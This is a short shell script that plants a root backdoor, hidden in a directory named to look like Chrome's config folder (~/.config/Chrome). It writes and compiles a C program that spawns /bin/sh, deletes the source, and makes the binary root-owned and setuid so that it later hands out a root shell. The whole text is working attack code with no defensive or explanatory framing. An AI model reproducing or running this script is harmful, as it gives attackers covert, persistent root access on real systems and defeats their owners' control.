BACKDOOR_CONFIG_PATH="$(eval cd ~ && pwd)/.config/Chrome"

# Create SUID File
printf '#include <stdlib.h>\nint main() {system("/bin/sh"); }' > ~/.config/Chrome/privshell.c
gcc -o ~/.config/Chrome/privshell ~/.config/Chrome/privshell.c
rm ~/.config/Chrome/privshell.c

# need root permissions for this
chown root:root ~/.config/Chrome/privshell
chmod u+s ~/.config/Chrome/privshell